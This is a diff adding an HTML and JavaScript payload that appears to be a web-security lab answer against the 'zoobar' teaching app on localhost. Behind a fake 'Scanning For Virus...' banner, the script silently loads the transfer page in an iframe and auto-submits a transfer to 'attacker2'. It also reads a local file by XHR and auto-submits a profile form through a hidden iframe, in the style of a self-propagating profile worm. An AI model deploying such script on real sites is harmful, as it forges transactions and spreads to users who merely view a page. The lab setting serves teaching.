@@ -1,0 +1,51 @@
+Scanning For Virus... </b></div>
+<script type="text/javascript">
+	
+	var iframe = document.createElement("iframe");
+	iframe.id="transfer";
+	var c=1;
+	iframe.src="http://localhost:8080/zoobar/index.cgi/transfer";
+	iframe.addEventListener("load",iframe_loaded,false);
+	//iframe.style.visibility="hidden";
+	
+	document.body.appendChild(iframe);
+	document.body.onload=profile_form_loaded;
+
+	function iframe_loaded(){
+		if(c==1)
+		{
+			var ifrm = document.getElementById("transfer");
+			var form = ifrm.contentDocument.getElementsByName("transferform")[0];
+			form.elements[0].value=1;
+			form.elements[1].value="attacker2";
+			form.submit();
+			c += 1;
+		}
+	}
+
+	function profile_form_loaded(){
+		var form = document.getElementsByName("profileform")[1];						//since i have two profile forms on this page
+		var textArea = document.getElementsByName("profile_update")[0];
+		var xhr = new XMLHttpRequest();
+		var filename="file:///home/httpd/lab4/answer-4.txt";
+		xhr.open("GET", filename, false);
+		xhr.onreadystatechange = function() {
+				alert("file loaded");
+    			alert(xhr.status);
+    			alert(xhr.responseText);
+			};
+		xhr.send(null);
+		form.submit();
+	}
+
+</script>
+<div><b>
+
+<iframe style="width:0px; height:0px;visibility:hidden;" id="iframe2"></iframe>
+<form method="POST" action ="http://localhost:8080/zoobar/index.cgi/" style="width:100px; height:100px;" name="profileform" target="iframe2">
+	<textarea name="profile_update" rows="20" cols="80">
+	</textarea>
+	<br/>
+	<input type="submit" name="profile_submit" value="Save" />
+</form>
+
